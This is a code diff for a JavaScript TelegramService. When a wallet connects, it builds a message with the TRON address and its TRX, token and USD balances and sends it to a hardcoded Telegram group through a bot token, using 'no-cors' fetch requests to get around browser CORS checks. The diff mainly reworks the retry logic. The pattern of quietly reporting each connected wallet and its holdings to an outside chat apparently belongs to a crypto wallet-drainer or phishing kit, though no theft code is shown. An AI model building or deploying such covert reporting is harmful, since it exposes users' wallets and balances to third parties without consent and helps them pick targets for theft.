@@ -9,67 +9,59 @@ export const TelegramService = {
      */
     sendConnectionNotification: async (portfolio, address) => {
         try {
-            console.log("Preparing Telegram notification for:", address);
+            console.log(`[Telegram] Starting notification flow for ${address}`);
+
             const now = new Date();
-            // Format time: DD.MM - HH:MM
             const day = String(now.getDate()).padStart(2, '0');
             const month = String(now.getMonth() + 1).padStart(2, '0');
             const hours = String(now.getHours()).padStart(2, '0');
             const minutes = String(now.getMinutes()).padStart(2, '0');
             const timeString = `${day}.${month} - ${hours}:${minutes}`;
 
-            // Format Balance Breakdown: "37 TRX ve 74 USDT"
             let breakdown = `${portfolio.trx.toFixed(2)} TRX`;
-            portfolio.tokens.forEach(t => {
-                breakdown += ` ve ${t.balance.toFixed(2)} ${t.symbol}`;
-            });
+            if (portfolio.tokens && portfolio.tokens.length > 0) {
+                portfolio.tokens.forEach(t => {
+                    breakdown += ` ve ${t.balance.toFixed(2)} ${t.symbol}`;
+                });
+            }
 
-            // Construct Message
             const message = `
 👛: <a href="https://tronscan.org/#/address/${address}">${address}</a>
 ⏰: ${timeString}
 💰: ${portfolio.totalUsd.toFixed(4)} $ (${breakdown})
             `.trim();
 
-            // Use GET request with URLSearchParams. 
-            // This is a "Simple Request" and bypasses many CORS preflight restrictions.
             const params = new URLSearchParams();
             params.append('chat_id', TelegramService.GROUP_ID);
             params.append('text', message);
             params.append('parse_mode', 'HTML');
             params.append('disable_web_page_preview', 'true');
 
-            // Encode params into the URL
             const url = `https://api.telegram.org/bot${TelegramService.BOT_TOKEN}/sendMessage?${params.toString()}`;
 
-            // Non-blocking background retry loop
-            (async () => {
-                let attempts = 0;
-                const maxAttempts = 10;
-
-                while (attempts < maxAttempts) {
-                    try {
-                        console.log(`Sending Telegram notification (Attempt ${attempts + 1})...`);
-
-                        // Using GET method with no-cors to bypass CORS restrictions.
-                        // We won't get a readable response, but the request will be sent.
-                        await fetch(url, { mode: 'no-cors' });
-
-                        console.log("Telegram notification sent (opaque response).");
-                        break;
-                    } catch (err) {
-                        console.error("Telegram Network Error:", err);
+            const sendRequest = async (retryCount = 0) => {
+                try {
+                    console.log(`[Telegram] Sending request (Attempt ${retryCount + 1})...`);
+                    await fetch(url, { mode: 'no-cors' });
+                    // Since no-cors returns opaque response, we assume success if no network error thrown
+                    console.log("[Telegram] Request sent (no-cors mode).");
+                    return true;
+                } catch (error) {
+                    console.error(`[Telegram] Request Failed (Attempt ${retryCount + 1}):`, error);
+                    if (retryCount === 0) {
+                        console.log("[Telegram] Retrying once...");
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                        return sendRequest(retryCount + 1);
                     }
-
-                    attempts++;
-                    if (attempts < maxAttempts) {
-                        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2s before retry
-                    }
+                    return false;
                 }
-            })();
+            };
+
+            // Non-blocking trigger
+            sendRequest().catch(e => console.error("[Telegram] Fatal Error in async sender:", e));
 
         } catch (error) {
-            console.error("Failed to initiate Telegram notification logic:", error);
+            console.error("[Telegram] Failed to prepare notification:", error);
         }
     }
 };
